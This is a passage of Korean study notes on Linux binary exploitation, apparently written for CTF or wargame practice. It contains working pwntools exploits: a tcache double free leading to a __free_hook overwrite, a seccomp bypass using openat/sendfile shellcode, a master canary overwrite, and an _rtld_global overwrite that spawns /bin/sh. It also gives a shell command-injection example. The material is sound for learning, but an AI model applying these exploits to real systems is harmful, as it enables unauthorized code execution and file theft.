print(&#39;offset_stdout:&#39;, hex(offset_stdout))

p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, p64(offset_stdout))


# tcache: (*) -&gt; chunk1 -&gt; stdout -&gt; _IO_2_1_stdout_ -&gt; ... 
# --------------------------

# pop chunk1 from  tcache
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; stdout -&gt; _IO_2_1_stdout_ -&gt; ... 
# --------------------------

# pop stdout
# stdout 의 실제 값에 영향을 주지 않고 프로그램 로직을 통해 tcache 에서 stdout 를 pop 하려면
# _IO_2_1_stdout_ 값을 그대로 write 해주면서 alloc 을 해야한다. 
# 전체를 write 하는 대신 마지막 byte 하나만 덮어써도 문제 없다.
lsb_of__IO_2_1_stdout_ = p64(lib.symbols[&#39;_IO_2_1_stdout_&#39;])[0:1] # least significant byte of _IO_2_1_stdout_
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, lsb_of__IO_2_1_stdout_)
print(&#39;lsb_of__IO_2_1_stdout_:&#39;, lsb_of__IO_2_1_stdout_)

# tcache: (*) -&gt; _IO_2_1_stdout_ -&gt; ... 
# --------------------------

###############
# 3. leak address into stdout
###############
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;3&#39;)
p.recvuntil(b&#39;Content: &#39;)
addr_stdout = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))

print(&#39;addr_stdout:&#39;, hex(addr_stdout))
libc_base = addr_stdout - lib.symbols[&#39;_IO_2_1_stdout_&#39;]
print(&#39;libc_base:&#39;, hex(libc_base))

###############
# 4. overwrite __free_hook
###############
offset_free_hook = lib.symbols[&#39;__free_hook&#39;]
print(&#39;offset_free_hook:&#39;, hex(offset_free_hook))
addr_free_hook = libc_base + offset_free_hook
print(&#39;addr_free_hook:&#39;, hex(addr_free_hook))

# 앞서 수행한 것 처럼, doubly free memory 를 한번 더 발생시킨다.
# chunk1 과 다른 크기의 메모리를 할당해야 함에 주의한다
# Doubly free memory
# alloc chunk2
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; NULL
# --------------------------

# free chunk2
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)

# tcache: (*) -&gt; chunk2
# --------------------------

# edit chunk2 (already freed)
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;4&#39;)
p.sendafter(b&#39;Edit chunk:&#39;, b&#39;A&#39; * 8 + b&#39;\x00&#39;)  # corrupt tcache_entry to free again

# free chunk2 again &lt;- Doubly Free Bug
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)
# 이제 tcache 에는 동일한 메모리 주소를 가리키는 두 개의 chunk 가 생겼다.
# tcache: (*) -&gt; chunk2 -&gt; chunk2
# --------------------------

# Poison tcache 
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, p64(addr_free_hook))

# tcache: (*) -&gt; chunk2 -&gt; __free_hook -&gt; ...
# --------------------------

# pop chunk1 from  tcache
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; __free_hook -&gt; ... 
# --------------------------

# pop __free_hook &amp; overwrite __free_hook with gadget
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;80&#39;)
p.sendafter(b&#39;Content:&#39;, p64(libc_base + GADGET))
print(&#39;gadget:&#39;, hex(libc_base + GADGET))
# tcache: (*) -&gt; ... 
# --------------------------

# call free (contaminated)
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)

p.interactive()
</code></pre></li></ul></li></ul><h3 id=logical-error>Logical Error<a hidden class=anchor aria-hidden=true href=#logical-error>#</a></h3><ul><li>OS 나 컴파일러의 구조적 취약점 뿐 아니라 개발자의 실수에 의한 취약점도 exploit 에 사용될 수 있다.</li></ul><h4 id=type-error>Type Error<a hidden class=anchor aria-hidden=true href=#type-error>#</a></h4><ul><li>변수에 담게 될 값의 크기, 용도, 부호 여부를 고려하지 않고 정의된 변수에 의해 의도치 않은 동작을 유발하는 에러</li><li><code>out of range</code> : 변수에 담을 수 있는 범위를 벗어나는 값을 저장하여 값이 잘리거나 부호가 반전되는 현상<ul><li>overflow : 값이 잘려서 예상 값보다 커지는 현상 (unsigned char 에 256 대입)</li><li>underflow : 표현할 수 없는 값을 변수에 대입하여 예상 값보다 작아지는 현상 (unsigned int 에 -1 대입)</li></ul></li></ul><h4 id=command-injection>Command Injection<a hidden class=anchor aria-hidden=true href=#command-injection>#</a></h4><ul><li>C 언어에서 <code>system</code> 함수를 사용하여 커널 명령어를 호출하도록 프로그래밍을 수행할 수 있다.<ul><li><code>system</code> 함수는 <code>execve</code> 시스템 콜을 호출하게 된다.</li></ul></li><li><code>Metacharacter</code> 를 이용해 특정 명령어 이후 &ldquo;/bin/sh&rdquo; 를 명령어로 입력하게 되면 쉘 권한을 탈취 당하게 된다.<ul><li>ex) <code>system("cat file.txt;/bin/sh")</code>: 의도한 동작은 <code>cat file.txt</code> 까지지만, <code>/bih/sh</code> 를 추가로 호출하였다.</li></ul></li></ul><h4 id=path-traversal>Path Traversal<a hidden class=anchor aria-hidden=true href=#path-traversal>#</a></h4><ul><li>허용되지 않은 경로에 사용자가 접근할 수 있는 취약점</li><li>임의의 파일을 읽고/쓰고/실행 시킬 수 있는 위험이 있다.</li><li>프로그램에서 의도하지 않은 절대경로, 상대경로 상으로 접근이 불가능하도록 로직상 제약이 필요하다.</li></ul><h3 id=bypass-seccomp>Bypass SECCOMP<a hidden class=anchor aria-hidden=true href=#bypass-seccomp>#</a></h3><ul><li><code>mmap</code> 을 이용하여 입력으로 받은 함수를 실행하도록 구현된 코드에서 exploit 을 위한 코드를 침투시킬 수 있으나, SECCOMP 기법으로 시스템콜을 차단함으로서 이를 방어할 수 있다.<ul><li>mmap 코드 예시<pre tabindex=0><code>void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
void (*sc)() = (void *)shellcode;
sc();
</code></pre></li></ul></li><li>SECCOMP는 특정 시스템 콜을 허용하거나 차단하여 의도하지 않은 시스템 콜의 호출을 막는 방어 기법이다. 하지만 시스템의 지속적인 개발에 의해 유사한 역할을 하는 다른 시스템콜들이 계속 생겨나고 있다.<ul><li>예를들어 open 과 openat 은 동일한 역할을 수행하며, <code>open</code>을 차단한 프로그램이 <code>openat</code>을 차단하지 않았다면 이를 이용한 해킹이 가능하다.</li><li>하지만, 시스템 콜 간에도 의존성이 있기 때문에 의존성이 있는 시스템 콜이 차단된 경우에는 우회가 불가능 될 가능성이 크다.</li><li>반대로 특정 라이브러리 함수에 의존하는 함수를 SECCOMP 설정으로 허용 해 놓는다면, 그 함수 또한 허용 되어 있음을 암시적으로 알 수 있다.<ul><li><code>execve</code> 함수는 내부적으로 <code>openat</code> 함수를 호출하고 있다.</li></ul></li><li><code>open</code>, <code>read</code>, <code>write</code> 는 타 시스템 콜의 영향을 받지 않고 실행할 수 있는 함수이다.</li></ul></li></ul><h4 id=exploit-예시-1>exploit 예시<a hidden class=anchor aria-hidden=true href=#exploit-예시-1>#</a></h4><ul><li><code>open</code> 함수를 막는 형태의 소스코드가 있을 떄, <code>openat</code> 를 사용하여 파일을 탈취하는 공격 방식이다.<ul><li>코드 일부: <code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);</code></li><li>단, <code>openat</code>은 첫 번째 인자를 <code>AT_FDCWD</code> 로 설정해야 open과 동일한 효과를 낸다.<ul><li><code>openat</code> 은 첫 번쨰 인자로 받은 file descriptor 에 해당하는 디렉터리에서 부터 상대 주소를 검색한다. 첫 번쨰 인자로 <code>AT_FDCWD</code> 를 입력하면 현재 작업 디렉터리를 기준으로 상대 주소를 검색하게 된다.</li></ul></li></ul></li></ul><pre tabindex=0><code>#!/usr/bin/env python3

from pwn import *

context.arch = &#39;x86_64&#39; # 아키텍처 설정
# p = process(&#39;./bypass_seccomp&#39;)

data = shellcraft.openat(&#39;AT_FDCWD&#39;, &#34;./flag&#34;) # AT_FDCWD 옵션을 넣어 현재 경로부터 상대 경로를 검색하도록 설정
data += &#39;mov r10, 0xffff&#39; # r10은 sendfile 호출시 전달할 데이터의 양을 뜻한다.
data += shellcraft.sendfile(1, &#39;rax&#39;, 0).replace(&#39;xor r10d, r10d&#39;,&#39;&#39;)# sendfile 호출시 `xor r10d, r10d` 구문이 자동으로 들어가서 r10을 초기화하므로 이를 제거한다.
# data += shellcraft.exit(0)

# print(data)

data = asm(data)

# print(data)

p.sendlineafter(b&#34;shellcode:&#34;, data)

p.interactive()
</code></pre><h3 id=master-canary>Master Canary<a hidden class=anchor aria-hidden=true href=#master-canary>#</a></h3><ul><li><p>앞서 SSP(Stack Smash Protector) 의 한 종류로 <a href=./#stack-canary>stack canary</a>를 배웠고, canary는 <a href=../../linux/thread/#tls--tsd>TLS</a>(Thread Local Storage) 의 데이터를 사용하여 만들어진다.</p></li><li><p><code>TLS</code> 영역은 <code>text</code>, <code>bss</code> 영역과 달리 로더에서 생성하는 영역이다.</p></li><li><p>로더에서 <code>TLS</code> 영역을 생성은 <code>init_tls</code> -> <code>dl_allocate_tls_storage</code> 함수에 의해 할당되고, <code>arch_prctl</code> 시스템 콜에서 <code>ARCH_SET_FS</code> 명령을 호출하여 <code>FS segment register</code> 가 <code>TLS</code> 영역을 가리키도록 초기화 한다.</p><ul><li><a href=../../assembly/assembly_basic/#%EC%84%B8%EA%B7%B8%EB%A8%BC%ED%8A%B8-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0>segment register</a></li></ul></li><li><p>한 프로그램의 모든 <code>Stack Canary</code> 는 <code>FS segment register</code> 의 0x28 번지에 위치하는 값을 사용하는데, FS segment는 TLS 로 초기화 되므로, FS:0x28 의 값은 TLS:0x28 의 값이다.</p><ul><li>gdb 에서 <code>$fs_base</code> 값은 <code>FS segment register</code> 를 의미한다. <code>p/x $fs_base</code> 명령으로 <code>FS segment register</code> 의 값을 확인 할 수 있다.</li></ul></li><li><p>때문에 &ldquo;TLS 주소에 0x28 바이트 만큼 떨어진 주소에 위치한 값&rdquo;(TLS:0x28) 을 <code>Master Canary</code> 라 부른다.</p></li><li><p>canary 는 시스템의 pointer 크기와 같은 크기를 가지며, 첫 byte는 NULL 이다.</p><ul><li><code>_dl_setup_stack_chk_guard</code> 함수에서 endian 에 따라 첫 byte를 NULL 로 설정한다.</li><li><code>THREAD_SET_STACK_GUARD</code> 매크로에서 TLS + 0x28 위치에 canary 값을 삽입한다.</li></ul></li><li><p>main thread 외 별도로 생성한 thread 에서 선언한 변수는 TLS 와 근접한 영역에 선언된다. 또한, 이 영역은 <code>FS segment register</code> 보다 낮은 주소에 위치하므로 master canary 의 값을 buffer overflow로 덮어 쓸 수 있다.</p></li></ul><h4 id=exploit-예시-2>exploit 예시<a hidden class=anchor aria-hidden=true href=#exploit-예시-2>#</a></h4><ul><li>전제조건 : thread에 선언한 버퍼에 buffer overflow를 발생할 수 있다.</li><li>exploit 순서<ol><li>디버깅을 통해 matser canary 와 버퍼 사이의 간격을 확인한다.<ul><li>code 상에서 buffer 가 사용되는 부분을 어셈블리어에서 확인한다.</li></ul><pre tabindex=0><code>   // 원본 함수
   void thread_routine() {
     char buf[256];
     int size = 0;
     printf(&#34;Size: &#34;);
     scanf(&#34;%d&#34;, &amp;size);
     printf(&#34;Data: &#34;);
     read_bytes(buf, size);
   }
   // disass 결과
   0x0000000000401347 &lt;+52&gt;:    call   0x4010f0 &lt;printf@plt&gt;
   0x000000000040134c &lt;+57&gt;:    lea    rax,[rbp-0x114]
   0x0000000000401353 &lt;+64&gt;:    mov    rsi,rax
   0x0000000000401356 &lt;+67&gt;:    lea    rdi,[rip+0xcb6]        # 0x402013
   0x000000000040135d &lt;+74&gt;:    mov    eax,0x0
   0x0000000000401362 &lt;+79&gt;:    call   0x401150 &lt;__isoc99_scanf@plt&gt;
   0x0000000000401367 &lt;+84&gt;:    lea    rdi,[rip+0xca8]        # 0x402016
   0x000000000040136e &lt;+91&gt;:    mov    eax,0x0
   0x0000000000401373 &lt;+96&gt;:    call   0x4010f0 &lt;printf@plt&gt;
   0x0000000000401378 &lt;+101&gt;:   mov    edx,DWORD PTR [rbp-0x114]
   // read_bytes 에서 사용될 첫 번째 인자 &#39;buf&#39; 가 rax 에 적용 될 것이며, 이는 [rbp-0x110] 값이 대응된다.
   0x000000000040137e &lt;+107&gt;:   lea    rax,[rbp-0x110]
   0x0000000000401385 &lt;+114&gt;:   mov    esi,edx
   0x0000000000401387 &lt;+116&gt;:   mov    rdi,rax
   0x000000000040138a &lt;+119&gt;:   call   0x4012be &lt;read_bytes&gt;
</code></pre></li><li>gdb 에서 thread_routine 함수까지 실행시킨 다음 <code>$fs_base + 0x28</code> 위치(canary가 저장된 <code>FS segment register</code>)의 주를 확인하고, overflow 가능한 버퍼와 거리를 측정한다.</li></ol><pre tabindex=0><code>pwndbg&gt; p/x ($rbp - 0x110)
$1 = 0x7ffff7da3de0
pwndbg&gt; p/x ($fs_base + 0x28)
$2 = 0x7ffff7da4728
pwndbg&gt; p/x 0x7ffff7da4728 - 0x7ffff7da3de0
$3 = 0x948
</code></pre><ol start=3><li>버퍼에서 부터 canary까지(rbp - 0x110 ~ $fs_base + 0x28 + 0x8) 임의의 값(&lsquo;AAAA&mldr;&rsquo;)으로 채워넣게 되면 SIGSEGV 에 의한 core dump가 발생할 수 있다.</li></ol><ul><li><a href=../../c++/gdb/#coredumb-%ED%8C%8C%EC%9D%BC>Coredump 확인 방법</a></li><li>stack 에서 버퍼 다음에는 다른 지역변수 값이 있을 텐데, 이를 모두 &lsquo;AAAA&mldr;&rsquo; 로 채울 경우 변수 참조시 에러가 발생할 수 있다.</li><li>thread 생성시 호출되는 <code>__pthread_disable_asynccancel</code> 함수에서 <code>struct pthread *self = THREAD_SELF;</code> 지역변수를 생성하고, <code>self->canceltype = PTHREAD_CANCEL_DEFERRED</code> 구문을 호출한다.</li><li><code>self->canceltype</code>의 주소가 &lsquo;AAAA&mldr;&rsquo; 로 덮어써지면 segment fault 가 발생한다.<ul><li>gdb 명령어로 <code>p &((struct pthread *) $fs_base)->header.self</code> 를 입력하여 이 값을 확인할 수 있다.</li><li>THREAD_SELF 는 스레드의 Thread Descriptor을 가리키는 매크로이다.</li></ul></li><li>버퍼로부터 <code>($fs_base)->header.self->canceltype</code> 위치까지의 거리를 계산하고, <code>self->canceltype</code> 이 rw 권한이 있는 곳을 가리키도록 버퍼에 적당한 값을 집어넣는다.<ul><li>disass 결과에 의하면 <code>__pthread_disable_asynccancel</code> 함수의 어셈블리 코드 <code>mov byte ptr [rax + 0x972], 0</code> 구문이 canceltype 을 대입하는 부분이고, 이떄 rax 는 <code>fs</code> 값이 채워져 있다.</li><li>즉, &ldquo;버퍼에서 self 까지의 거리&rdquo; + 0x972 가 self->canceltype 의 주소이다.</li></ul></li></ul><ol start=4><li><code>vmmap</code> 명령어로 실행파일을 분석하여 rw 권한이 모두 존재하는 영역의 주소를 찾는다.</li></ol><ul><li>프로그램 실행에 최대한 영향을 주지 않게 하기 위해 주소의 중간 영역을 임의로 골라 self->canceltype 의 주소값이 rw 권한을 가질 수 있게 버퍼를 조정한다.<ul><li>ex)<pre tabindex=0><code># payload 가 (rbp - 0x110) ~ ($fs_base + 0x28) 영역을 덮어쓰도록 구성한다.
payload = b&#39;A&#39;*0x910  # buffer ~ self 까지 거리
payload += p64(0x404800 - 0x972)  # self-&gt;canceltype 에 들어갈 주소 (rw권한 존재)
payload += b&#39;C&#39; * 0x10  # 남는영역 마저 채우기 ()
payload += p64(0x4141414141414141)  # master canary 영역
</code></pre></li></ul></li></ul><ol start=5><li>return 주소에 exploit 을 위한 함수가 호출되도록 변경</li></ol><ul><li>ex)<pre tabindex=0><code>p = process(&#39;./mc_thread2&#39;)
elf = ELF(&#39;./mc_thread&#39;)
payload = b&#39;A&#39; * 264  # buffer ~ 지역변수 영역
payload += b&#39;A&#39; * 8 # canary
payload += b&#39;B&#39; * 8 # SFP
payload += p64(elf.symbols[&#39;giveshell&#39;])  # return address (exploit 을 위한 함수로 변경)
payload += b&#39;C&#39; * (0x910 - len(payload))  # master canary 영역을 변조시키기 위한 dummy
payload += p64(0x404800 - 0x972)  # self-&gt;canceltype 를 적용 할 때 발생하는 SIGSEGV 를 없애기 위한 처리
payload += b&#39;C&#39; * 0x10  # 나머지 영역 dummy 로 채우기
payload += p64(0x4141414141414141) # master canary 변조
p.sendafter(b&#39;Data: &#39;, payload)
p.interactive()
</code></pre></li></ul></li></ul><h3 id=overwrite-_rtld_global>Overwrite _rtld_global<a hidden class=anchor aria-hidden=true href=#overwrite-_rtld_global>#</a></h3><ul><li>glibc 라이브러리를 포함하여 컴파일 한 프로그램은 실행시 <code>__libc_start_main</code> 가 호출된다.<ul><li><code>__libc_start_main</code>는 <code>main</code> 함수를 호출한다.</li><li><code>main</code>함수가 종료되면 <code>__GI_exit</code> 함수가 호출된다.</li><li><code>__GI_exit</code> 함수는 <code>__run_exit_handlers</code> 함수를 호출한다.</li><li><code>__run_exit_handlers</code> 함수에서는 <code>exit_function</code> 구조체의 <code>fns</code> 인자를 호출하는데, 이는 <code>_dl_fini</code> 를 호출하게 되어있다.</li><li><code>_dl_fini</code> 함수는 <code>_dl_load_lock</code> 을 인자로 <code>dl_rtld_lock_recursive</code> 함수를 호출한다.<ul><li><code>_dl_load_lock</code> 은 <code>_rtld_global</code> 구조체의 멤버 변수이다.</li><li><code>dl_rtld_lock_recursive</code> 함수도 <code>_rtld_global</code> 구조체의 멤버 변수이다.</li><li>glibc 2.27 기준, <code>_rtld_global</code> 구조체의 <code>dl_rtld_lock_recursive</code> 포인터 가 저장된 메모리는 읽기/쓰기 권한이 모두 부여되어 있기 때문에 이 함수를 덮어써서 exploit 을 수행 할 수 있다.</li><li>쓰기 권한을 부여한 이유는 <code>dl_main</code> 함수에서 <code>_rtld_global</code> 구조체의 <code>dl_rtld_lock_recursive</code> 영역을 초기화 할 수 있게 하기 위함이었다.</li></ul></li></ul></li><li><code>_rtld_global</code> 구조체의 주소를 확인하고, <code>_dl_load_lock</code> 과 <code>dl_rtld_lock_recursive</code> 의 포인터를 덮어 써서 exploit 을 할 수 있다.</li></ul><h4 id=exploit-예시-3>exploit 예시<a hidden class=anchor aria-hidden=true href=#exploit-예시-3>#</a></h4><ul><li>전제조건 :<ul><li>실행중 라이브러리 함수 혹은 변수의 주소를 획득 할 수 있어야 한다.<ul><li>(예시 코드에서는 stdout 코드를 일부러 출력 해 준다.)</li><li>ex) <code>printf("stdout: %p\n", stdout);</code></li></ul></li><li>특정 주소에 데이터를 주입하는 구문이 존재한다.<ul><li>ex)<pre tabindex=0><code>printf(&#34;addr: &#34;);
scanf(&#34;%ld&#34;, &amp;addr);  // 주소 입력
printf(&#34;data: &#34;);
scanf(&#34;%ld&#34;, &amp;data);  // 데이터 팁력
*(long long *)addr = data;  // 주소가 가리키는 값에 데이터 저장
</code></pre></li></ul></li></ul></li><li>exploit 방법 :<ol><li><p>exploit 대상 시스템이 사용하는 라이브러리 파일을 준비한다.</p><ul><li><code>ldd</code> 명령으로 라이브러리 의존성을 확인한다.<pre tabindex=0><code> linux-vdso.so.1 (0x00007fff96777000)
 libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcdb0aa5000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcdb1098000)
</code></pre></li><li><a href=../pwntool#Patchelf>patchelf</a> 도구를 사용하여 ld 및 libc 라이브러리 의존성을 변경한다.<ul><li><code>patchelf --set-interpreter {라이브러리} {실행파일}</code> 명령으로 실행파일에 적용될 라이브러리를 변경 가능하다. (ld 라이브러리 적용)</li></ul></li><li><code>export LD_PRELOAD=$(realpath {라이브러리_파일})</code> 명령으로 라이브러리 파일의 참조 위치도 변경한다. (libc 라이브러리 적용)</li></ul></li><li><p>실행 파일에서 libc 라이브러리의 offset을 구한다.</p><ul><li>코드에서 <code>stdout</code> 을 호출했으므로, libc 파일이 로드 되었을 것이다.</li><li><code>.bss</code> 영역에 libc 영역이 포함되고, <code>gdb</code> 에서 <code>vmmap</code> 명령으로 <code>libc*</code> 형태의 파일이 처음 시작하는 offset을 추출할 수 있다.<pre tabindex=0><code>0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000      0 /lib/x86_64-linux-gnu/libc-2.27.so
</code></pre></li></ul></li><li><p>ld 라이브러리의 base offset을 구한다.</p><ul><li>마찬가지로 <code>gdb</code> 에서 <code>vmmap</code> 명령으로 <code>ld*</code> 파일의 시작 offset을 찾는다.<pre tabindex=0><code>0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000      0 /volume/pwn/lecture/rtld_global/ld-2.27.so
</code></pre></li></ul></li><li><p><code>_rtld_global</code> 구조체 멤버들의 offset을 확인한다.</p><ul><li>libc 라이브러리 파일을 실행시켜서 버전을 확인한다.<pre tabindex=0><code> $ ./libc-2.27.so
 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
 Copyright (C) 2018 Free Software Foundation, Inc.
 This is free software; see the source for copying conditions.
 There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
 PARTICULAR PURPOSE.
 Compiled by GNU CC version 7.3.0.
 libc ABIs: UNIQUE IFUNC
 For bug reporting instructions, please see:
 &lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre><ul><li>&ldquo;2.27-3ubuntu1&rdquo; 구문이 libc 의 상세 버전인데, 해당 버전의 debug package 를 획득항혀야 한다.</li><li>구글에 검색하여 획득 하면 된다. (<a href=https://launchpad.net/ubuntu/bionic/amd64/libc6-dbg/2.27-3ubuntu1>https://launchpad.net/ubuntu/bionic/amd64/libc6-dbg/2.27-3ubuntu1</a>) or (<a href=http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb>http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb</a>)</li><li>획득한 .deb 파일을 <code>dpkg -x</code> 명령으로 압축을 해제한 후, 압축 해제된 <code>usr/lib/debug/lib/x86_64-linux-gnu/ld-2.27.so</code> 파일을 gdb로 실행한다.</li><li><code>_rtld_global</code> 구조체의 멤버 변수 <code>_dl_load_lock</code>, <code>_dl_rtld_lock_recursive</code> 가 필요하므로 아래와 같이 두 변수의 주소를 확인한다.<pre tabindex=0><code>pwndbg&gt;  p &amp;_rtld_global._dl_load_lock
$1 = (__rtld_lock_recursive_t *) 0x228968 &lt;_rtld_local+2312&gt;
pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive
$2 = (void (**)(void *)) 0x228f60 &lt;_rtld_local+3840&gt;
</code></pre></li></ul></li></ul></li><li><p>exploit 코드를 작성한다.</p><ul><li>libc_base 의 offset 을 구한다. libc 파일의 ELF에서 <code>_IO_2_1_stdout_</code> 심볼로 획득 가능하다.</li><li>libc_base 와 ld_base 의 offset 차이를 이용해 ld_base의 주소를 구한다.<ul><li>2,3번 과정에서 구한 주소를 서로 빼서 간격을 구한다. (예시에서는 0x3f1000 만큼 차이가 난다.)</li></ul></li><li>_rtld_global 의 주소를 구한다. ld 파일의 ELF에서 <code>_rtld_global</code> 심볼로 offset 을 획득하고, ld_base 주소를 더해 <code>_rtld_global</code> 의 실제 주소를 구한다.</li><li>4에서 구한 _rtld_global 구조체의 멤버변수 <code>_dl_load_lock</code>, <code>_dl_rtld_lock_recursive</code> 의 offset 을 <code>_rtld_global</code> 주소에 더해 각 변수가 메모리에 적재된 주소를 구한다.</li><li>exploit 을 위해 <code>_dl_rtld_lock_recursive</code> 변수를 libc 라이브러리의 <code>system</code> 함수로 덮어쓰고, <code>dl_load_lock</code> 를 &ldquo;sh&rdquo; 로 치환한다.<ul><li>앞서 <a href=./#Overwrite-_rtld_global>Overwrite _rtld_global</a> 에서 살펴보았듯, main 함수가 종료될 때 <code>_dl_rtld_lock_recursive(dl_load_lock)</code> 형태로 함수가 호출되는 점을 이용한 것</li></ul></li></ul></li></ol></li><li>최종 코드<pre tabindex=0><code>#!/usr/bin/env python3
from pwn import *

p = process(&#39;./ow_rtld&#39;, env= {&#34;LD_PRELOAD&#34; : &#34;./libc-2.27.so&#34;}) # {&#34;LD_LIBRARY_PATH&#34; : &#34;.&#34;} 구문으로도 가능
libc = ELF(&#39;./libc-2.27.so&#39;)
ld = ELF(&#39;./ld-2.27.so&#39;)

# gdb를 통해 획득한 정보
LIBC_BASE_OFFSET = 0x3f1000
DL_LOAD_LOCK_OFFSET_FROM_RTLD_GLOBAL = 2312
DL_RTLD_LOCK_RECURSIVE_OFFSET_FROM_RTLD_GLOBAL = 3840

# exploit 코드
p.recvuntil(b&#39;: &#39;)
stdout = int(p.recvuntil(b&#39;\n&#39;), 16)  # stdout 변수의 주소 획득
libc_base = stdout - libc.symbols[&#39;_IO_2_1_stdout_&#39;]  # libc_base 주소 획득
ld_base = libc_base + 0x3f1000  # ld_base 주소 계산
print(&#39;libc_base:&#39;, hex(libc_base))
print(&#39;ld_base:&#39;, hex(ld_base))
rtld_global = ld_base + ld.symbols[&#39;_rtld_global&#39;]  # _rtld_global 주소 획득
dl_load_lock = rtld_global + DL_LOAD_LOCK_OFFSET_FROM_RTLD_GLOBAL  # _dl_load_lock 주소 계산
dl_rtld_lock_recursive = rtld_global + DL_RTLD_LOCK_RECURSIVE_OFFSET_FROM_RTLD_GLOBAL  # _dl_rtld_lock_recursive  주소 &gt;계산
print(&#39;rtld_global:&#39;, hex(rtld_global))
print(&#39;dl_load_lock:&#39;, hex(dl_load_lock))
print(&#39;dl_rtld_lock_recursive:&#39;, hex(dl_rtld_lock_recursive))

system = libc_base + libc.symbols[&#39;system&#39;]  # system 함수의 주소 획득
print(&#39;system:&#39;, hex(system))
# _dl_rtld_lock_recursive 주소에 system 함수 덮어쓰기
p.sendlineafter(b&#39;&gt; &#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;addr: &#39;, str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b&#39;data: &#39;, str(system).encode())
# dl_load_lock 주소에 &#34;/bin/sh&#34; 문자열 덮어쓰기
p.sendlineafter(b&#39;&gt; &#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;addr: &#39;, str(dl_load_lock).encode())
p.sendlineafter(b&#39;data: &#39;, str(u64(&#39;/bin/sh\x00&#39;)).encode())

# main 함수 종료
p.sendlineafter(b&#39;&gt; &#39;, b&#39;2&#39;)

p.interactive()
</code></pre></li></ul><h3 id=__environ>__environ<a hidden class=anchor aria-hidden=true href=#__environ>#</a></h3><ul><li>환경변수는 동적인 값들의 모임으로 시스템의 동작에 관한 정보를 저장하는 변수이다.<ul><li>환경변수는 사용자에 의해 수정 및 삭제가 가능하다.</li><li>프로그램도 실행 시 환경변수를 참조한다. 프로그램을 실행시키면 스택 영역에 환경변수 정보가 탑재된다.</li><li>라이브러리 함수도 스택 영역의 환경변수를 참조하기 때문에, 이를 이용하면 환경변수가 존재하는 스택 영역의 주소를 추출 할 수 있다.<ul><li><code>execve</code>, <code>getenv</code> 등의 함수가 환경변수를 참조한다.</li><li>libc.so 파일의 <code>elf</code> 를 분석하면 <code>__environ</code> 이라는 변수가 존재한다.<pre tabindex=0><code>$ readelf -s ./libc.so.6 | grep &#34;environ&#34;
133: 0000000000221200     8 OBJECT  WEAK   DEFAULT   35 _environ@@GLIBC_2.2.5
724: 0000000000221200     8 OBJECT  GLOBAL DEFAULT   35 __environ@@GLIBC_2.2.5
958: 0000000000221200     8 OBJECT  WEAK   DEFAULT   35 environ@@GLIBC_2.2.5
</code></pre></li><li>gdb 에서 <code>__environ</code> 변수를 확인 해 보면 stack 영역에 자리잡고 있음을 알 수 있다.<pre tabindex=0><code>pwndbg&gt; x/g __environ
0x7fffffffe6c8: 0x00007fffffffe8cb
pwndbg&gt; vmmap 0x00007fffffffe6c8
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
         Start                End Perm     Size Offset File
0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack] +0x206c8
</code></pre></li></ul></li></ul></li></ul><h4 id=exploit-예시-4>exploit 예시<a hidden class=anchor aria-hidden=true href=#exploit-예시-4>#</a></h4><ul><li><p>전제조건:</p><ul><li><code>stdout</code> 변수의 주소값을 알 수 있다. (예시에서는 일부러 출력해 줌)</li><li>탈취할 파일을 프로그램에서 읽어서 버퍼에 저장한다.</li><li>임의 주소 읽기 취약점이 존재한다.<pre tabindex=0><code>scanf(&#34;%ld&#34;, &amp;addr);
printf(&#34;%s&#34;, (char *)addr);
